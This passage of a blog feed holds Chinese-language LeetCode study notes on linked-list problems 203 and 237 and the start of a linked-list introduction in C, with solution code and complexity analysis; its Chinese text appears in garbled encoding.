        <content type="html"><![CDATA[<h1 id="é¡Œç›®æ•˜è¿°"><a href="#é¡Œç›®æ•˜è¿°" class="headerlink" title="é¡Œç›®æ•˜è¿°"></a>é¡Œç›®æ•˜è¿°</h1><p><img src="/img/LeetCode/203/question1.png"></p><p><img src="/img/LeetCode/203/question2.png"></p><ul><li>é¡Œç›®é›£åº¦: Easy</li><li>é¡Œç›®æè¿°: çµ¦å®šä¸€å€‹ Linked List çš„ <code>head</code> ä»¥åŠæƒ³è¦åˆªé™¤ç¯€é»çš„æ•¸å€¼ <code>val</code>ï¼Œè¦æˆ‘å€‘ç§»é™¤listä¸­<strong>æ‰€æœ‰ç­‰æ–¼ <code>val</code> çš„ç¯€é»</strong>ï¼Œæ‰€ä»¥å¦‚æœæ‰€æœ‰ç¯€é»æ•¸å€¼éƒ½ç­‰æ–¼ <code>val</code> å‰‡çµæœæœƒæ˜¯ä¸€å€‹ emptt list</li></ul><h1 id="è§£æ³•"><a href="#è§£æ³•" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h1><h2 id="ä¸€é–‹å§‹çš„æƒ³æ³•"><a href="#ä¸€é–‹å§‹çš„æƒ³æ³•" class="headerlink" title="ä¸€é–‹å§‹çš„æƒ³æ³•"></a>ä¸€é–‹å§‹çš„æƒ³æ³•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. å®šç¾©ç¯€é»çµæ§‹</span><br><span class="line">2. å»ºç«‹ linked list</span><br><span class="line">3. removeElements</span><br><span class="line">3-1. å®£å‘Šæš«å­˜ç©ºé–“</span><br><span class="line">3-2  åˆ¤æ–·æ˜¯å¦æ˜¯ Empty List</span><br><span class="line">3-3. èµ°è¨ªæ•´å€‹List</span><br><span class="line">3-4. åˆ¤æ–·æ˜¯å¦ç­‰æ–¼ valï¼Œå¦‚æœç­‰æ–¼:é‚£å°±å°‡å‰ä¸€å€‹ç¯€é»é€£æ¥åˆ°å¾Œä¸€å€‹ç¯€é»ï¼Œä¸¦é‡‹æ”¾è¨˜æ†¶é«”ä»¥åˆªé™¤ val æ‰€åœ¨ç¯€é»</span><br><span class="line">3-5  å›å‚³head</span><br></pre></td></tr></table></figure><p>é€™æ˜¯çœ‹åˆ°é¡Œç›®å¾Œä¸€é–‹å§‹çš„ä¸»è¦æƒ³æ³•ï¼Œä¸¦ä¸”ä¸€é–‹å§‹å¾ˆå¤©çœŸçš„æƒ³èªªé‚„éœ€è¦è€ƒæ…®åˆªé™¤ç¯€é»åœ¨ Head, ä¸­é–“ ä»¥åŠ Tail ä¸‰ç¨®ç‹€æ³ï¼Œå¯¦ä½œå¾Œæ‰ç™¼ç¾å…¶å¯¦åªéœ€è¦åˆ¤æ–·é ­è·Ÿå…¶ä»–åœ°æ–¹å°±å¥½ï¼ŒTail æ‡‰è©²ä¸ç”¨å–®ç¨æ‹¿å‡ºä¾†è™•ç†ã€‚</p><h2 id="æˆ‘çš„è§£æ³•"><a href="#æˆ‘çš„è§£æ³•" class="headerlink" title="æˆ‘çš„è§£æ³•"></a>æˆ‘çš„è§£æ³•</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">removeElements</span><span class="params">(<span class="keyword">struct</span> ListNode* head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">ptr</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">previous</span> =</span> head;</span><br><span class="line">    <span class="comment">// empty list</span></span><br><span class="line">    <span class="keyword">if</span> (ptr== <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;empty list\n&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> ptr;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( ptr-&gt;val == val)&#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">tmp</span> =</span> ptr;</span><br><span class="line">            <span class="keyword">if</span>( ptr == head )&#123;</span><br><span class="line">                head = ptr-&gt;next;</span><br><span class="line">                ptr = ptr-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;   </span><br><span class="line">                previous-&gt;next = ptr-&gt;next;</span><br><span class="line">                ptr = ptr-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(tmp);</span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            previous = ptr;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="èªªæ˜"><a href="#èªªæ˜" class="headerlink" title="èªªæ˜"></a>èªªæ˜</h3><ul><li>ç¨‹å¼ç¢¼åœ¨ä¸€é–‹å§‹å®£å‘Šäº†å…©å€‹æŒ‡æ¨™ï¼Œåˆ†åˆ¥ç”¨ä¾†éæ­·éˆçµä¸²åˆ— (<code>ptr</code>) å’Œè·Ÿè¸ªç•¶å‰ç¯€é»çš„å‰ä¸€å€‹ç¯€é» (<code>previous</code>)</li><li>é¦–å…ˆåˆ¤æ–· Empty List çš„ç‹€æ³ï¼Œè‹¥ç™¼ç¾ emptry list å›å‚³ headï¼ŒåŸå°ä¸å‹•çš„é‚„å›å»</li><li>æ¥è‘—ï¼Œè‹¥ç¯€é»ä¸æ˜¯ç©ºçš„ï¼Œå‰‡é–‹å§‹éæ­·æ•´å€‹Listï¼Œå¦‚æœç™¼ç¾ç¯€é»çš„è³‡æ–™ç­‰æ–¼ <code>val</code> (<code>if ( ptr-&gt;val == val)</code>)ï¼Œå‰‡å¯ä»¥å¾ŒçºŒåˆ¤æ–·æ˜¯å¦æ˜¯åœ¨é ­ç¯€é»é‚„æ˜¯å…¶ä»–åœ°æ–¹ï¼Œå¦‚æœè³‡æ–™ä¸åŒ¹é…ï¼Œé‚£å°±ç›´æ¥æ›ä¸‹ä¸€å€‹ç¯€é» ï¼Œæ‰€ä»¥è¦æ›´æ–° <code>previous</code> æŒ‡æ¨™ä»¥åŠ <code>ptr</code>æŒ‡æ¨™ (<code>previous = ptr;</code>, <code>ptr = ptr-&gt;next;</code>)</li><li>ç•¶ç„¶ï¼Œé‚„éœ€è¦å®£å‘Šä¸€å€‹æš«å­˜ç”¨çš„æŒ‡æ¨™ï¼Œä¾†å­˜æ”¾è¦è¢«åˆªé™¤çš„ç¯€é»ä½å€</li><li>æ¥è‘—åˆ¤æ–· <code>ptr == head </code> æ˜¯å¦ç‚ºé ­ç¯€é»ï¼Œå¦‚æœæ˜¯é‚£å°±æ›´æ–° <code>head</code> æŒ‡æ¨™ï¼Œä»¥åŠ <code>ptr</code> æŒ‡æ¨™ï¼Œä¾†ç¹¼çºŒèµ°è¨ªï¼Œä¸¦ä¸”é€é free ä¾†é‡‹æ”¾è¨˜æ†¶é«”ä½å€</li><li>å¦‚æœä¸æ˜¯é ­ç¯€é»ï¼Œä¹Ÿå°±æ˜¯ä¸­é–“æˆ–tailç¯€é»ï¼Œé€™æ™‚éœ€è¦å°‡å‰ä¸€å€‹ç¯€é»æŒ‡å‘ <code>val</code> çš„å¾Œä¸€å€‹ç¯€é» (<code>previous-&gt;next = ptr-&gt;next;</code>)ï¼Œå¾ŒçºŒä¸€æ¨£å†ç”¨ <code>ptr = ptr-&gt;next;</code> ä¾†ç¹¼çºŒèµ°è¨ª list </li><li>å›å‚³ <code>head</code></li></ul><h3 id="åŸ·è¡Œçµæœ"><a href="#åŸ·è¡Œçµæœ" class="headerlink" title="åŸ·è¡Œçµæœ"></a>åŸ·è¡Œçµæœ</h3><p><img src="/img/LeetCode/203/result1.png"></p><h2 id="æ›´å¥½çš„åšæ³•"><a href="#æ›´å¥½çš„åšæ³•" class="headerlink" title="æ›´å¥½çš„åšæ³•"></a>æ›´å¥½çš„åšæ³•</h2><p>ä¸Šé¢çš„åšæ³•ä½¿ç”¨äº†å…©å€‹æŒ‡æ¨™ä¾†å„²å­˜ç‹€æ…‹ï¼Œå…¶å¯¦ä¹Ÿæœ‰è¾¦æ³•æ¸›å°‘åˆ°ä½¿ç”¨ä¸€å€‹æŒ‡æ¨™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">removeElements</span><span class="params">(<span class="keyword">struct</span> ListNode* head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="comment">// Apporach-2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">ptr</span> =</span> head;</span><br><span class="line">    <span class="comment">// empty list</span></span><br><span class="line">    <span class="keyword">if</span> (ptr== <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;empty list\n&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> ptr;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Handle head node</span></span><br><span class="line">    <span class="keyword">while</span>(head!=<span class="literal">NULL</span> &amp;&amp; head-&gt;val==val)&#123;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( ptr != <span class="literal">NULL</span> &amp;&amp; ptr-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( ptr-&gt;next-&gt;val == val)&#123;</span><br><span class="line">            ptr-&gt;next = ptr-&gt;next-&gt;next;     </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŸ·è¡Œçµæœ-1"><a href="#åŸ·è¡Œçµæœ-1" class="headerlink" title="åŸ·è¡Œçµæœ"></a>åŸ·è¡Œçµæœ</h3><p><img src="/img/LeetCode/203/result2.png"></p><p>å°æ¯”å…ˆå‰çš„çµæœï¼Œåˆæ›´é€²ä¸€æ­¥æ¸›å°‘ç©ºé–“çš„ä½¿ç”¨</p><h2 id="æ™‚é–“è¤‡é›œåº¦åˆ†æ"><a href="#æ™‚é–“è¤‡é›œåº¦åˆ†æ" class="headerlink" title="æ™‚é–“è¤‡é›œåº¦åˆ†æ"></a>æ™‚é–“è¤‡é›œåº¦åˆ†æ</h2><ul><li>æ™‚é–“è¤‡é›œåº¦: $O(n)$:  whileè¿´åœˆé€™éƒ¨åˆ†æ˜¯traverseéˆçµä¸²åˆ—çš„ä¸»è¦é‚è¼¯ã€‚éæ­·æ•´å€‹éˆçµä¸²åˆ—çš„æ™‚é–“è¤‡é›œåº¦æ˜¯ $O(n)$ï¼Œå…¶ä¸­ <code>n</code> æ˜¯éˆçµä¸²åˆ—ä¸­çš„ç¯€é»æ•¸é‡ã€‚åœ¨æœ€å£æƒ…æ³ä¸‹ï¼Œæ¯å€‹ç¯€é»éƒ½æœƒè¢«æª¢æŸ¥ä¸€æ¬¡ï¼Œä¸¦ä¸”å¯èƒ½æœƒè¢«åˆªé™¤</li><li>ç©ºé–“è¤‡é›œåº¦ $O(1)$: é€™æ®µç¨‹å¼ç¢¼ä¸éœ€è¦é¡å¤–çš„æ•¸æ“šçµæ§‹ä¾†å­˜å„²éˆçµä¸²åˆ—æˆ–å…¶éƒ¨åˆ†ï¼Œé™¤äº† <code>*ptr</code>, <code>*previous</code> å…©å€‹æŒ‡æ¨™è®Šæ•¸ï¼Œé€™äº›éƒ½æ˜¯ç”¨æ–¼éæ­·å’Œæ“ä½œéˆçµä¸²åˆ—çš„æŒ‡é‡ï¼Œä½”ç”¨çš„æ˜¯å¸¸æ•¸ç©ºé–“ï¼Œå³ $O(1)$ï¼Œåˆªé™¤ç¯€é»æ™‚ä½¿ç”¨çš„è‡¨æ™‚æŒ‡æ¨™ä¹Ÿå±¬æ–¼å¸¸æ•¸ç©ºé–“ï¼Œå› æ­¤æ•´é«”ç©ºé–“è¤‡é›œåº¦ä¾ç„¶æ˜¯ $O(1)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCodeç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆªé™¤éˆçµä¸²åˆ— | Medium | LeetCode#237 Delete Node in a Linked List</title>
      <link href="/posts/5efda43a.html"/>
      <url>/posts/5efda43a.html</url>
      
        <content type="html"><![CDATA[<h1 id="é¡Œç›®æ•˜è¿°"><a href="#é¡Œç›®æ•˜è¿°" class="headerlink" title="é¡Œç›®æ•˜è¿°"></a>é¡Œç›®æ•˜è¿°</h1><p><img src="/img/LeetCode/237/question-1.png"></p><p><img src="/img/LeetCode/237/question-2.png"></p><p><img src="/img/LeetCode/237/question-3.png"></p><ul><li>é¡Œç›®é›£åº¦: <code>Medium</code></li><li>é¡Œç›®æè¿°: å¦‚åŒåœ–ä¸­æ‰€è¿°ï¼Œé¡Œç›®ä¸­è¦æ±‚æˆ‘å€‘å°ä¸€å€‹ Single Linked List <code>head</code> å»å¯¦ç¾ä¸€å€‹åˆªé™¤ç‰¹å®šç¯€é»çš„å‡½å¼ï¼Œå‡½å¼çš„è¼¸å…¥å«åš <code>node</code>ï¼Œé¡Œç›®ä¸­æœ‰ç‰¹åˆ¥èªªæ˜ã€‚</li><li>é™åˆ¶:<ul><li><code>node</code> ä¸æœƒæ˜¯ <code>head</code>ä¸­çš„æœ€å¾Œä¸€å€‹ç¯€é»ï¼Œä¸¦ä¸”æˆ‘å€‘ä¸¦ä¸èƒ½å¤ å­˜å– <code>head</code> ä¸­çš„ç¬¬ä¸€å€‹å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯æ•´å€‹ List çš„åˆå§‹ç¯€é»ã€‚</li><li>é€™é¡Œçš„åˆªé™¤ç¯€é»ä¸éœ€è¦é‡‹æ”¾è¨˜æ†¶é«”ï¼Œåƒ…éœ€å°‡å‰ä¸€å€‹ç¯€é»é€£æ¥åˆ° <code>node</code> çš„å¾Œä¸€å€‹ç¯€é»</li></ul></li></ul><blockquote><p>åœ¨ Run ä»¥åŠ Submit çš„æ™‚å€™ï¼Œé¡Œç›®æœƒå»ºå¥½List ä¸¦ä¸”å‘¼å«æˆ‘å€‘å¯«çš„functionï¼Œä¾†å»é€²è¡Œæ¸¬è©¦ï¼Œé€™é¡Œåªéœ€è¦å°ˆæ³¨åœ¨åˆªé™¤ç¯€é»çš„é‚è¼¯ä¸Šå°±å¥½</p></blockquote><h1 id="è§£æ³•"><a href="#è§£æ³•" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h1><h2 id="ä¸€é–‹å§‹çš„æƒ³æ³•"><a href="#ä¸€é–‹å§‹çš„æƒ³æ³•" class="headerlink" title="ä¸€é–‹å§‹çš„æƒ³æ³•"></a>ä¸€é–‹å§‹çš„æƒ³æ³•</h2><p>ä¸€é–‹å§‹æˆ‘é™·å…¥äº†å‚³çµ±åˆªé™¤ç¯€é»çš„åšæ³•ç•¶ä¸­ï¼Œä¹Ÿå°±æ˜¯å·²çŸ¥åˆå§‹ç¯€é»çš„æ¢ä»¶ä¸‹å»èµ°è¨ªæ¯å€‹ç¯€é»ï¼ŒæŒ‡åˆ°æ‰¾åˆ°çµ¦å®šç¯€é»ï¼Œå†å»åŸ·è¡Œåˆªé™¤çš„é‚è¼¯ã€‚</p><h3 id="å‚³çµ±ä½œæ³•"><a href="#å‚³çµ±ä½œæ³•" class="headerlink" title="å‚³çµ±ä½œæ³•"></a>å‚³çµ±ä½œæ³•</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Node* <span class="title function_">DeleteNode</span><span class="params">(Node* first ,Node* node)</span>&#123;</span><br><span class="line">    Node* ptr= first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Noting to print\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Delete first node of the list</span></span><br><span class="line">    <span class="keyword">if</span> (node == first)&#123;</span><br><span class="line">        <span class="comment">// Update the first pointer to the next node</span></span><br><span class="line">        first = first-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// ptr traverse through the list</span></span><br><span class="line">        <span class="keyword">while</span> (ptr-&gt;next != node)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr-&gt;next = node-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€™ç¨®åšæ³•æœƒ<strong>éœ€è¦çŸ¥é“ <code>node</code>çš„å‰ä¸€å€‹ç¯€é»ï¼Œæ‰æœ‰è¾¦æ³•æŒ‡å‘åˆ° <code>node</code>çš„ä¸‹ä¸€å€‹ç¯€é»</strong>ï¼Œä½†é€™é¡Œä¸­ï¼Œå·²çŸ¥è³‡è¨Šåªæœ‰ <code>node</code> çš„ä½å€ï¼Œ<strong>å› æ­¤æ²’è¾¦æ³•çŸ¥é“å‰ä¸€å€‹ç¯€é»æ˜¯èª°ã€‚</strong></p><p><img src="/img/LeetCode/237/explain.png"></p><h2 id="æˆ‘çš„è§£æ³•"><a href="#æˆ‘çš„è§£æ³•" class="headerlink" title="æˆ‘çš„è§£æ³•"></a>æˆ‘çš„è§£æ³•</h2><p>é¢å°é€™ç¨®ç‹€æ³ï¼Œå¯ä»¥æ›ä¸€å€‹æƒ³æ³•ï¼Œ<strong>å¯ä»¥æŠŠ <code>node</code> å¾Œé¢ç¯€é»çš„è³‡æ–™å¾€å‰è¤‡è£½éä¾†ï¼ŒæŒçºŒé€²è¡Œï¼Œç›´åˆ°é‡åˆ°NULLï¼Œä¹Ÿèƒ½å¤ å¯¦ç¾ä¸€æ¨£çš„æ•ˆæœ</strong></p><p><img src="/img/LeetCode/237/solution.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">deleteNode</span><span class="params">(<span class="keyword">struct</span> ListNode* node)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>  *<span class="title">nextNode</span>, *<span class="title">current</span> =</span> node ;</span><br><span class="line">    <span class="keyword">while</span>(current-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line"></span><br><span class="line">        nextNode = current-&gt;next;</span><br><span class="line">        current-&gt;val = nextNode-&gt;val;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;next-&gt;next == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            current-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//update current pointer</span></span><br><span class="line">            current = nextNode;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸ·è¡Œçµæœå¦‚ä¸‹:</p><p><img src="/img/LeetCode/237/result-1.png"></p><h2 id="æ›´å¥½çš„åšæ³•"><a href="#æ›´å¥½çš„åšæ³•" class="headerlink" title="æ›´å¥½çš„åšæ³•"></a>æ›´å¥½çš„åšæ³•</h2><p>å…¶å¯¦æœ‰æ›´åŠ ç²¾ç°¡çš„å¯«æ³•ï¼Œä½†æ™‚é–“è¤‡é›œåº¦å…¶å¯¦æ²’ä»€éº¼å¤ªå¤§å·®ç•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">deleteNode</span><span class="params">(<span class="keyword">struct</span> ListNode* node)</span>&#123;</span><br><span class="line">    node-&gt;val = node-&gt;next-&gt;val;</span><br><span class="line">    node-&gt;next = node-&gt;next-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸ·è¡Œçµæœ:<br><img src="/img/LeetCode/237/result-2.png"></p><blockquote><p>ä½†å¥½åƒå¤šèŠ±è²»äº† 1ms, â€¦.</p></blockquote><h2 id="æ™‚é–“è¤‡é›œåº¦åˆ†æ"><a href="#æ™‚é–“è¤‡é›œåº¦åˆ†æ" class="headerlink" title="æ™‚é–“è¤‡é›œåº¦åˆ†æ"></a>æ™‚é–“è¤‡é›œåº¦åˆ†æ</h2><p><strong>æ™‚é–“è¤‡é›œåº¦</strong>: $O(1)$: æœ¬æ¼”ç®—æ³•åŒ…å«å›ºå®šæ•¸é‡çš„æ“ä½œï¼Œåƒæ˜¯æ›´æ–°ç•¶å‰ç¯€é»çš„è³‡æ–™ä¸¦æ›´æ”¹å…¶ä¸‹ä¸€å€‹æŒ‡æ¨™ï¼Œé€™äº›æ“ä½œä¸­çš„æ¯ä¸€å€‹éƒ½éœ€è¦å›ºå®šçš„æ™‚é–“ï¼Œç„¡è«– Linked List çš„å¤§å°å¦‚ä½•ã€‚<br><strong>ç©ºé–“è¤‡é›œåº¦</strong>: $O(1)$: é€™ç¨®åˆªé™¤æŠ€è¡“ä¸éœ€è¦ä»»ä½•é¡å¤–çš„è¨˜æ†¶é«”åˆ†é…ï¼Œå› ç‚ºå®ƒç›´æ¥åœ¨ç¾æœ‰ç¯€é»ä¸Šæ“ä½œè€Œç„¡éœ€å»ºç«‹é¡å¤–çš„è³‡æ–™çµæ§‹</p>]]></content>
      
      
      <categories>
          
          <category> LeetCodeç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Linked List </tag>
            
            <tag> Medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¡Œå¿…å‚™ç¥å™¨ | éˆçµä¸²åˆ— (Linked List) | LeetCode ç­†è¨˜</title>
      <link href="/posts/c1fe4928.html"/>
      <url>/posts/c1fe4928.html</url>
      
        <content type="html"><![CDATA[<h1 id="éˆçµä¸²åˆ—-Linked-List-ä»‹ç´¹"><a href="#éˆçµä¸²åˆ—-Linked-List-ä»‹ç´¹" class="headerlink" title="éˆçµä¸²åˆ—(Linked List)ä»‹ç´¹"></a>éˆçµä¸²åˆ—(Linked List)ä»‹ç´¹</h1><p><img src="/img/LeetCode/Linked_List/linked_list.png"></p><p>Linked List æ˜¯ä¸€ç¨®å¸¸è¦‹çš„è³‡æ–™çµæ§‹ï¼Œå…¶çµ„æˆä¸»è¦åŒ…å« <strong>è³‡æ–™</strong> å’Œ <strong>ä¸‹ä¸€å€‹ç¯€é»çš„ä½å€</strong>ï¼Œå› æ­¤æ§‹æˆç¯€é»èˆ‡ç¯€é»ç›¸äº’éˆçµçš„çµæ§‹ï¼Œå…¶ä¸­æœ€å¾Œä¸€å€‹ç¯€é»æœƒæŒ‡å‘åˆ° NULL é€™å€‹ä½å€ã€‚</p><p>æˆ‘å€‘å¯¦è¸çš„ä¸»è¦æ–¹å¼é‚„æ˜¯é€é C èªè¨€å»æ“ä½œï¼Œæƒ³è¦å¯¦ç¾ Linked List å¿…é ˆå…ˆé€é <code>struct</code> ä¾†å»å…ˆå®šç¾©ç¯€é»æœ¬èº«</p><h1 id="Linked-List-å¯¦è¸"><a href="#Linked-List-å¯¦è¸" class="headerlink" title="Linked List å¯¦è¸"></a>Linked List å¯¦è¸</h1><h2 id="å®šç¾©ç¯€é»"><a href="#å®šç¾©ç¯€é»" class="headerlink" title="å®šç¾©ç¯€é»"></a>å®šç¾©ç¯€é»</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; Node;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢å®šç¾©äº† node é€™å€‹çµæ§‹ï¼Œå…¶ä¸­åŒ…å«äº†æ•´æ•¸è³‡æ–™ <code>data</code>ï¼Œ ä»£è¡¨ç¯€é»æœ¬èº«å­˜æ”¾çš„è³‡æ–™ ä»¥åŠstruct å‹åˆ¥çš„æŒ‡æ¨™ï¼Œä¸‹ä¸€å€‹çµæ§‹ç›¸åŒç¯€é»çš„è¨˜æ†¶é«”ä½å€ <code>next</code>ã€‚ä¸¦ä¸”æ­¤çµæ§‹çš„å®£å‘Šç‚º <code>Node</code>ï¼Œæ–¹ä¾¿æˆ‘å€‘å¾ŒçºŒå®£å‘Šç¯€é»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Node *first_node;</span><br><span class="line">Node *current_node;</span><br><span class="line">Node *previous_node;</span><br></pre></td></tr></table></figure><p>æˆ‘å€‘å¯ä»¥é€é Node ä¾†å»å®£å‘Šä¸‰å€‹æŒ‡æ¨™ï¼ŒæŒ‡å‘ä¸‰å€‹çµæ§‹çš„è¨˜æ†¶é«”ä½å€ï¼Œåˆ†åˆ¥ç‚º <code>first_node</code>, <code>current_node</code>, <code>previous_node</code>ã€‚é€™ä¸‰å€‹æŒ‡æ¨™çš„ç”¨é€”:</p><ul><li><code>first_node</code> ç”¨ä¾†æŒ‡å‘éˆçµçš„èµ·å§‹ä½å€</li><li><code>current_node</code> 